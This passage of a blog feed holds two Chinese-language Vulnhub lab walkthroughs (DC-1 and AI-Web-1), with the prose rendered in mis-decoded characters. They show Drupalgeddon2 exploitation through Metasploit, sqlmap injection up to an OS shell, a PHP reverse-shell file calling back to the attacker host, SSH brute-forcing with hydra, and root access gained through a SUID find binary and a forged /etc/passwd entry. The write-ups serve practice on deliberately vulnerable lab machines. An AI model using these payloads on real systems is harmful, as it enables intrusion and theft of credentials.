        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/">å®˜ç½‘ç›´æ¥ä¸‹è½½zip</a></p><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é¦–å…ˆæ‰«æä¸€ä¸‹ä¸»æœºå­˜æ´»çœ‹ä¸€ä¸‹é¶æœºIPï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332767.png" alt="image-20230503133212652"><br>æœ€åç¡®å®šé¶æœºIPä¸º192.168.75.133å¯ä»¥ä¸€ä¸ªä¸ªè®¿é—®ç¡®å®šï¼Œä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹é¶æœºçš„macåœ°å€ç¡®å®š<br>è®¿é—®å¾—åˆ°å¦‚ä¸‹é¡µé¢<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332069.png"><br>è¿™ä¸ªDrupalæœ‰ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œçš„cveä¸ºCVE-2018-7600ï¼Œå½“ç„¶è¿˜ä¸çŸ¥é“ç‰ˆæœ¬å¯¹ä¸å¯¹ï¼Œä¸è¿‡å…ˆä¸æ€¥ç€çœ‹è¿™ä¸ªCVEï¼Œç”¨nmapæ‰«æä¸€ä¸‹å¼€æ”¾çš„ç«¯å£<br><code>nmap -A 192.168.75.133</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332578.png" alt="image-20230503133247513"><br>åˆ©ç”¨æ’ä»¶çœ‹ä¸€ä¸‹æŒ‡çº¹ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°Drupalç‰ˆæœ¬ä¸º7æ˜¯å­˜åœ¨è¿™ä¸ªCVEæ¼æ´çš„<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332162.png" alt="image-20230503133258116"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>ç›´æ¥åˆ©ç”¨msfconsoleæ¥çœ‹ä¸€ä¸‹ï¼Œè¿™é‡Œæ‰‹åŠ¨å¼„çš„è¯å¾ˆéº»çƒ¦ï¼Œè¿›å…¥msfæœä¸€ä¸‹è¿™ä¸ªæ¨¡å—<br><code>search Drupal</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333978.png" alt="image-20230503133311896"><br>ç›´æ¥ä½¿ç”¨18å¹´çš„é‚£ä¸ªCVE<code>use exploit/unix/webapp/drupal_drupalgeddon2</code>ç„¶åæŸ¥çœ‹ä¸€ä¸‹payloadæ‰§è¡Œ<code>show payloads</code>å¯ä»¥çœ‹åˆ°æ‰€æœ‰payloadåˆ—å‡ºï¼Œä½¿ç”¨å¦‚ä¸‹payloadï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä¸è®¾ç½®ï¼Œæˆ‘æ˜¯ä¸ºäº†ç»ƒä¹ ä¸€ä¸‹å·¥å…·ä½¿ç”¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333921.png" alt="image-20230503133321883"><br><code>set payload php/meterpreter/reverse_tcp</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333997.png" alt="image-20230503133330955"><br>ç„¶åæŸ¥çœ‹éœ€è¦é…ç½®çš„å‚æ•°<br><code>show options</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333547.png" alt="image-20230503133344476"><br>yesä¸ºå¿…å¡«å‚æ•°ï¼Œæœ‰é»˜è®¤çš„ç›´æ¥ç”¨ï¼Œè¿™é‡Œå°±åªéœ€è¦é…ä¸€ä¸‹RHOSTSå³é¶æœºIP<br><code>set rhosts 192.168.75.133</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334617.png" alt="image-20230503133401577"><br>ç„¶åå¼€å§‹æ”»å‡»<code>exploit</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334085.png" alt="image-20230503133412030"><br>æ”»å‡»æˆåŠŸï¼Œæ‹¿shell<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334632.png" alt="image-20230503133423597"><br>lsçœ‹åˆ°flag1å…ˆæ‰“å¼€çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334177.png" alt="image-20230503133433140"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>ç”¨pythonè·å–äº¤äº’å¼shell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334420.png" alt="image-20230503133444394"><br>çœ‹ä¸€ä¸‹ç”¨æˆ·æƒé™ï¼Œåªæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334760.png" alt="image-20230503133458731"><br>æ ¹æ®flag1æç¤ºçœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ç™¾åº¦å¾—åˆ°é…ç½®æ–‡ä»¶åsettings.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `find / -name settings.php`</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤<code>find . -name &quot;set*&quot;</code>æœåˆ°é…ç½®æ–‡ä»¶<br>æ‹¿åˆ°flag2å’Œä¸€ä¸ªæ•°æ®åº“<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335864.png" alt="image-20230503133518795"></p><h2 id="flag3ï¼Œæ‹¿ä¸‹æ•°æ®åº“"><a href="#flag3ï¼Œæ‹¿ä¸‹æ•°æ®åº“" class="headerlink" title="flag3ï¼Œæ‹¿ä¸‹æ•°æ®åº“"></a>flag3ï¼Œæ‹¿ä¸‹æ•°æ®åº“</h2><p>ç™»å…¥æ•°æ®åº“<br><code>mysql -udbuser -pR0ck3t</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335424.png" alt="image-20230503133539364"><br>ç„¶åå°±æ˜¯æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“é‡Œé¢çš„ä¸œè¥¿<br><code>show databases;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335139.png" alt="image-20230503133553088"><br><code>use drupaldb;show tables;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336614.png" alt="image-20230503133605586"><br>æŸ¥çœ‹è¿™ä¸ªusersè¡¨<br><code>select * from users\G;</code><br>è¿™é‡Œ<code>\G</code>å°±æ˜¯çºµå‘æ˜¾ç¤ºæ•°æ®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336167.png" alt="image-20230503133616089"><br>å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·ï¼Œä¸è¿‡å¯†ç ä¸æ˜¯æ˜æ–‡ï¼Œæ¨¡ç³Šæœç´¢ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰åŠ å¯†è„šæœ¬<br><code>find . -name &quot;*hash*&quot;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336085.png" alt="image-20230503133629051"><br>æ‰¾åˆ°åŠ å¯†è„šæœ¬ï¼Œç®€å•è¿è¡Œä¸€ä¸‹çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336935.png" alt="image-20230503133639889"><br>è¿™é‡Œåº”è¯¥å°±æ˜¯ç›´æ¥åœ¨åé¢åŠ ä¸Šå¯†ç å°±å¯ä»¥å¾—åˆ°å¯†æ–‡ï¼Œåæ­£å°±æ˜¯å¤šå°è¯•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336174.png" alt="image-20230503133652131"><br>è¿™é‡Œæˆ‘ä»¬æƒ³è¯•å‡ºadminçš„å¯†ç å¾ˆéš¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›´æ¥åœ¨æ•°æ®åº“é‡Œé¢è¿›è¡Œæ›¿æ¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DQg60FlJLrmVGTkV6v6xnQKJGLPv9Bq5mNizW6/kv0IeIyA.2dyd&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337238.png" alt="image-20230503133707194"><br>æ›¿æ¢æˆåŠŸï¼Œç„¶åç™»å½•çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337851.png" alt="image-20230503133717797"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337379.png" alt="image-20230503133727343"><br>åœ¨è¿™é‡Œæ‰¾åˆ°flag3</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>æ ¹æ®flag3æç¤ºï¼Œæ‰“å¼€&#x2F;etc&#x2F;passwdçœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337479.png" alt="image-20230503133743399"><br>å¾—åˆ°flag4ç”¨æˆ·ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ°flag4ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·Hydraå»çˆ†ç ´ç”¨æˆ·sshå¯†ç è¿œç¨‹ç™»å½•<br><code>hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.75.133</code><br>ä½†æ˜¯æ—¢ç„¶èƒ½ç›´æ¥æ‰“å¼€æ²¡å¿…è¦å»çˆ†ç ´<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337304.png" alt="image-20230503133756258"><br>æç¤ºrootç›®å½•ä½†æ˜¯æ²¡æœ‰æƒé™æ‰“å¼€ï¼Œå¼€å§‹ææƒ</p><h2 id="flag5ï¼Œsuidææƒ"><a href="#flag5ï¼Œsuidææƒ" class="headerlink" title="flag5ï¼Œsuidææƒ"></a>flag5ï¼Œsuidææƒ</h2><p>åˆ©ç”¨findå‘½ä»¤ï¼Œæ‰¾æŸ¥å…·æœ‰SUIDæƒé™çš„å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">find æŒ‡ä»¤  </span><br><span class="line">/ æ ¹ç›®å½•(æŸ¥æ‰¾ä½ç½®)  </span><br><span class="line">-perm æƒé™  </span><br><span class="line">-u ç”¨æˆ·(s=ç‰¹æƒ)  </span><br><span class="line">-type ç±»å‹  </span><br><span class="line">f æ–‡ä»¶  </span><br><span class="line">2&gt;/dev/nul è¿‡æ»¤é”™è¯¯ä¿¡æ¯(ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338317.png" alt="image-20230503133811249"><br>findå‘½ä»¤åœ¨é‡Œé¢å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒæ¥ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br><span class="line"></span><br><span class="line">æ‰¾æŸ¥ä»€ä¹ˆæ–‡ä»¶ä¸é‡è¦ï¼ˆä½†æ˜¯æ˜¯å­˜åœ¨çš„æ–‡ä»¶ï¼‰ï¼Œåªéœ€è¦æ ¼å¼å¯¹ï¼Œç„¶ååé¢åŠ ä¸Š</span><br><span class="line">-exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338793.png" alt="image-20230503133821756"><br>ææƒæˆåŠŸï¼Œç„¶åè¿›å…¥rootç›®å½•æŸ¥çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338643.png" alt="image-20230503133830589"><br>æ‰¾åˆ°æœ€åä¸€ä¸ªflagï¼Œæ‰“é¶ç»“æŸ</p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--Ai-Web1</title>
      <link href="/2023/05/Vulnhub-Ai-Web1/"/>
      <url>/2023/05/Vulnhub-Ai-Web1/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>ç›´æ¥ä¸‹è½½é¶æœºç„¶åè§£å‹ï¼ŒVMwareä¸Šè¿è¡Œvmxæ–‡ä»¶å°±è¡Œï¼Œ<a href="https://www.vulnhub.com/entry/ai-web-1,353/">é¶æœºé“¾æ¥</a><br>è¿è¡Œé¶æœºä¼šæœ‰è¦å¯†ç ç™»å½•ï¼Œåˆ«ç®¡å°±è¡Œï¼Œå› ä¸ºæ¸—é€å·²ç»å¼€å§‹äº†ï¼ï¼</p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>ä½¿ç”¨netdiscoveræ‰«æip<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012014759.png" alt="image-20230501201446634"><br>æŒ¨ä¸ªè®¿é—®ï¼Œæœ€ç»ˆå‘ç°192.168.75.132è¿™ä¸ªIPå¯ç–‘<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015300.png" alt="image-20230501201508266"><br>nmapæ‰«æä¸€ä¸‹è¿™ä¸ªIP æŸ¥çœ‹å¼€æ”¾ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sV -O -A -P 192.168.75.132</span><br><span class="line">-T4(é€Ÿåº¦) -sV(ç‰ˆæœ¬æ‰«æå’Œå¼€å¯çš„æœåŠ¡) -O(æ“ä½œç³»ç»Ÿ) -p-ï¼ˆå…¨éƒ¨ç«¯å£</span><br><span class="line">è¿™é‡Œå…¶å®ç”¨-Aå°±å¯ä»¥ï¼Œä¸»è¦æ—¶ç†Ÿæ‚‰ä¸€ä¸‹å‚æ•°</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015178.png" alt="image-20230501201519095"><br>å¯ä»¥çœ‹åˆ°80ç«¯å£å¼€æ”¾ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è®¿é—®çš„é‚£ä¸ªé¡µé¢ï¼Œç›´æ¥æ‰«ä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015905.png" alt="image-20230501201529877"><br>å­˜åœ¨ä¸€ä¸ªrobots.txt<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015947.png" alt="image-20230501201540911"><br>emmmmï¼Œä¸¤ä¸ªéƒ½æ˜¯403ï¼Œç„¶åå¯¹ç€è¿™ä¸ªä¸¤ä¸ªè·¯å¾„æ‰«ä¸€ä¸‹ï¼Œæ‰«åˆ°ä¸€ä¸ª<code>http://192.168.75.132/m3diNf0/info.php</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015714.png" alt="image-20230501201552683"><br>ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œç„¶åæ‰«å¦ä¸€ä¸ª<code>http://192.168.75.132/se3reTdir777</code>è¿™é‡Œä¸€å¼€å§‹æ‰«çš„uploadsä½†æ˜¯æ²¡æœ‰ä¸œè¥¿ç„¶åå°±æ‰«äº†è¿™ä¸ªï¼Œçœ‹wpæœ‰çš„æ˜¯ç”¨çš„kaliä¸‹çš„dirbï¼Œæ¶¨å§¿åŠ¿äº†ä»¥å‰éƒ½ä¸çŸ¥é“è¿™ä¸ªå·¥å…·<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016438.png" alt="image-20230501201605406"><br>è®¿é—®index.phpï¼Œä¸­é€”æ–­å¼€è¿æ¥äº†è¿˜ä»¥ä¸ºæ˜¯é¢˜ç›®çš„è®¾å®šã€‚ã€‚ã€‚è®¿é—®å¾—åˆ°ä¸‹é¢çš„è¡¨å•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016204.png" alt="image-20230501201615163"></p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>ä½¿ç”¨<code>1&#39;</code>æ¢æµ‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ï¼Œå‘ç°æŠ¥é”™<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016498.png" alt="image-20230501201626465"><br>ç„¶åä½¿ç”¨<code>1&#39;#</code>æ­£å¸¸sqlæ³¨å…¥æ²¡è·‘äº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016645.png" alt="image-20230501201634617"><br>æŠ“ä¸ªåŒ…å¾—åˆ°å‚æ•°ï¼Œå› ä¸ºæ˜¯postæ³¨å…¥ç›´æ¥ä¿å­˜ä¸€ä¸‹è¿™ä¸ªåŒ…ç„¶åä¸¢sqlmapå…ˆè·‘ä¸€ä¸‹ï¼Œæ¯•ç«Ÿä¸æ˜¯ctfé¢˜åº”è¯¥èƒ½è·‘å‡ºæ¥<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016931.png" alt="image-20230501201645892"><br><code>python sqlmap.py -r &quot;E:\vuluhubé¶åœº\AI Web 1.0\åšé¢˜\1.txt&quot; -p uid --dbs</code>æ‰§è¡Œå‘½ä»¤ç›´æ¥è·‘ï¼Œè·‘çš„æ—¶å€™æ‰‹å·¥æµ‹äº†ä¸€ä¸‹å‘ç°unionæ²¡æ³•æ³¨å› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œç„¶åå‘ç°å­˜åœ¨å»¶æ—¶æ³¨å…¥ï¼Œæœç„¶sqlmapä¸€å¼€å§‹æ²¡æ³¨å‡ºæ¥<br><code>python sqlmap.py -r &quot;E:\vuluhubé¶åœº\AI Web 1.0\åšé¢˜\1.txt&quot; -p uid --technique=T --dbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmapæŒ‡å®šæ³¨å…¥ç±»å‹</span><br><span class="line">--technique=T</span><br><span class="line">B:å¸ƒå°”ç›²æ³¨</span><br><span class="line">E:æŠ¥é”™æ³¨å…¥</span><br><span class="line">U:è”åˆæŸ¥è¯¢æ³¨å…¥</span><br><span class="line">S:æ–‡ä»¶ç³»ç»Ÿ,æ“ä½œç³»ç»Ÿ,æ³¨å†Œè¡¨ç›¸å…³</span><br><span class="line">T:æ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ç§æ–¹å¼éƒ½æ²¡æ³¨å‡ºæ¥ã€‚ã€‚ã€‚çœ‹çœ‹wpæ€ä¹ˆæ³¨çš„å§<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --dbs</code><br>å¥½å§ï¼Œç›´æ¥æŒ‡å®šå‚æ•°æ³¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017136.png" alt="image-20230501201714088"><br>emmmï¼Œkaliä¸‹çš„sqlmapè¿™ä¹ˆå¿«çš„å—ï¼Œä¸€ç›´ç”¨çš„Windowsä¸‹çš„ï¼Œçœ‹çœ‹aiweb1<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --tables -D aiweb1</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017717.png" alt="image-20230501201722682"><br>çœ‹å­—æ®µ<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --columns -D aiweb1 -T user</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017314.png" alt="image-20230501201733277"><br>æ²¡å•¥ä¸œè¥¿ï¼Œç›´æ¥æ‹¿shellå§<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --os-shell</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017902.png" alt="image-20230501201755826"><br>ä¸‹é¢çš„2ä¸ºè‡ªå®šä¹‰ä¸Šä¼ è·¯å¾„ç»“åˆæˆ‘ä»¬åˆšåˆšå¾—åˆ°çš„ç»å¯¹è·¯å¾„å°±èƒ½çŸ¥é“é©¬çš„ä½ç½®ï¼Œé€šè¿‡ä¸‹é¢çš„æ“ä½œèƒ½çŸ¥é“æƒé™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆwhoamiå‘½ä»¤æ²¡æœ‰è¾“å‡ºï¼Œéš¾é“æ²¡æœ‰ï¼Ÿï¼Ÿ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018282.png" alt="image-20230501201810247"><br>çŸ¥é“ç»å¯¹è·¯å¾„é‚£å°±å†™ä¸ªä¸€å¥è¯æœ¨é©¬è¿›å…¥ï¼Œsqlmapçš„é©¬èšå‰‘è¿ä¸ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.132/se3reTdir777&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./2.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/2.php</span><br><span class="line"></span><br><span class="line">--file-write:å»è¯»å–æ–‡ä»¶(1.php)</span><br><span class="line">--file-dest:åé¢åŠ ç›®æ ‡çš„ç»å¯¹è·¯å¾„ å·²ç»ç”Ÿæˆæœ¨é©¬çš„åç§°ï¼ˆ1.phpï¼‰</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€æ ·çš„å‘½ä»¤wpèƒ½ä¸Šä¼ ä¸Šå»æˆ‘ä¸è¡Œï¼Œæ—¢ç„¶ä¸€å¥è¯ä¼ ä¸ä¸Šå»é‚£å°±ç›´æ¥å°è¯•åå¼¹shell</p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>å‡†å¤‡ä¸€ä¸ªåå¼¹shellçš„phpæ–‡ä»¶,ï¼ŒIPä¸ºkali IP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.75.128&quot;</span>,<span class="number">6666</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨pythonæ­å»ºä¸€ä¸ªç®€æ˜“çš„webæœåŠ¡ï¼Œè¿™é‡Œpythonå†…ç½®äº†æ¨¡å—åªéœ€è¦æ‰§è¡Œå‘½ä»¤å°±è¡Œï¼Œä¸‹é¢ä¸ºpython3ç¯å¢ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">9999</span></span><br><span class="line"><span class="comment">#9999ä¸ºç«¯å£å·ï¼Œå¯è‡ªå·±æŒ‡å®š</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šåœ¨é¡µé¢æ˜¾ç¤ºå½“å‰ç›®å½•çš„æ–‡ä»¶ï¼Œå¦‚æœæœ‰é»˜è®¤çš„index.htmlæ–‡ä»¶å°±ä¼šä¼˜å…ˆæ˜¾ç¤ºï¼Œè¿™é‡Œåˆæœ‰ä¸ªå‘å°±æ˜¯æˆ‘æ–‡ä»¶æ”¾åœ¨æ¡Œé¢å®ƒä¸æ˜¾ç¤ºï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018642.png" alt="image-20230501201822611"><br>ç„¶ååœ¨é¶æœºä¸Šä½¿ç”¨wgetä¸‹è½½shellæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018555.png" alt="image-20230501201833498"><br>å»ºç«‹ç›‘å¬ï¼Œç„¶ååœ¨é¶æœºä¸Šè¿è¡Œshell.php<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018907.png" alt="image-20230501201842818"><br>è¿™é‡Œä¸€æ¬¡æ²¡æˆåŠŸå¤šè¯•å‡ ä¸‹å°±è¡Œï¼ŒæŸ¥çœ‹æƒé™ä¸ºwww-dataï¼Œä¸‹é¢å¼€å§‹ææƒ</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æ‰§è¡Œå‘½ä»¤<code>ls -l /etc/passwd</code>å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·å¯¹etc&#x2F;passwdæ–‡ä»¶å…·æœ‰rw(è¯»å†™)æƒé™<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012019372.png" alt="image-20230501201935342"><br>å†™å…¥çš„æ—¶å€™å¯†ç æ˜¯åŠ å¯†çš„ï¼Œæ‰€ä»¥è¦å…ˆåŠ å¯†å¯†ç ï¼š<br><code> openssl passwd -1 -salt web1 123456</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012019455.png" alt="image-20230501201943426"><br>ç„¶åå†™å…¥å¯†ç <br><code>echo &#39;web1:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0::/root:/bin/bash&#39; &gt;&gt;/etc/passwd</code><br>ç›´æ¥åˆ‡æ¢ç”¨æˆ·ä¼šæŠ¥é”™<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021388.png" alt="image-20230501202106358"><br>è½¬æ¢ä¸ºäº¤äº’å¼shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021499.png" alt="image-20230501202135452"><br>å¯ä»¥çœ‹åˆ°æƒé™å·²ç»æ˜¯rootäº†ï¼Œflagåœ¨rootç›®å½•ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021654.png" alt="image-20230501202154593"><br>ç¬¬ä¸€æ¬¡åšè¿™ç§é¶åœºè¿˜æŒºæœ‰æ„æ€</p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CCé“¾1--LazyMapé“¾</title>
      <link href="/2023/04/CC%E9%93%BE1-LazyMap%E9%93%BE/"/>
      <url>/2023/04/CC%E9%93%BE1-LazyMap%E9%93%BE/</url>
      
